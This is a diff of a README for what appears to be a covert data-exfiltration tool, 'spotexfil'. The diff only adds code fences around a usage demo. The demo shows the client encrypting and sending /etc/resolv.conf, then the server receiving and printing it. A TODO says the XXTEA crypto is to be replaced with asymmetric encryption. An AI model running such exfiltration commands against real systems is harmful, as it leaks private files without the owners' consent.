@@ -8,6 +8,7 @@ Really MVP/prototype, not meant for large files.
 
 Using /etc/resolv.conf as payload:
 
+```
 $ ./spotexfil_client.py -f /etc/resolv.conf
 [*] Data cleared
 "0614b19d74be941ac3a89fdcbc33d3ebc62cb996f574a1b3cb95867c1db90b87ca154ad38151a25e09d2b9429f66ad8d00afb005b1e257f89c27b030ca46ae3b6856574d3bc40476fd3c0703618f4ac4810dc59b7797dc1a873252de1017fd12205e99458eb0f40c4fa98db36cc972ec3c7f008541450e8269679fd6e54cf09ac432e002fdfb3be3ae85fa89373e0ad3c68af7bde50
@@ -17,9 +18,10 @@ b5118c7d5947d2f1a467069e3f2796b3859015741622226f58609dcee056954b42520dfeb8d09c12
 728a9be5127a45b5aa4b1a6f6cbd216f1e0ae80d843ad2f15a07ae721773eb529ea64963557196ba8bd29eca370ff3a8ae6d32f67251edb078619a4d97db332ccf432402a3a45b5675b82e6f8"
 	[*] Creating inpayloadwetrust600
 [*] Data encoded and sent
+```
 
 Receiving from a far:
-
+```
 $ ./spotexfil_server.py -r
 #
 # macOS Notice
@@ -38,7 +40,7 @@ $ ./spotexfil_server.py -r
 #
 domain nyc.rr.com
 nameserver 172.16.0.1
-
+```
 
 # TODO
 * move from XXTEA crappy easy crypto to asymmetric (working in separate branch)
